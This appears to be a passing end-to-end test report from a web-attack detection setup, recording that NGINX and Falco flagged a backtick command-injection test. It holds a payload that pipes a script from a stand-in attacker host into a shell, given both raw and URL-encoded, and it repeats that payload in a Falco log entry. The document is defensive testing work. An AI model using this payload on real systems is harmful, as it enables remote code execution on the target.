name: test_e2e_with_logs[317_CMD_BACK_004]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BACK_004` |
| **Name** | Remote script execution via backticks |
| **Category** | CMDI |
| **Subcategory** | backtick |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: ``curl -s http://attacker.com | sh``
- **Encoded**: `%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 13:45:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1772113532995-tbkibh pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1772113532995-tbkibh pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:45:32.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1772113532995-tbkibh pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET
```
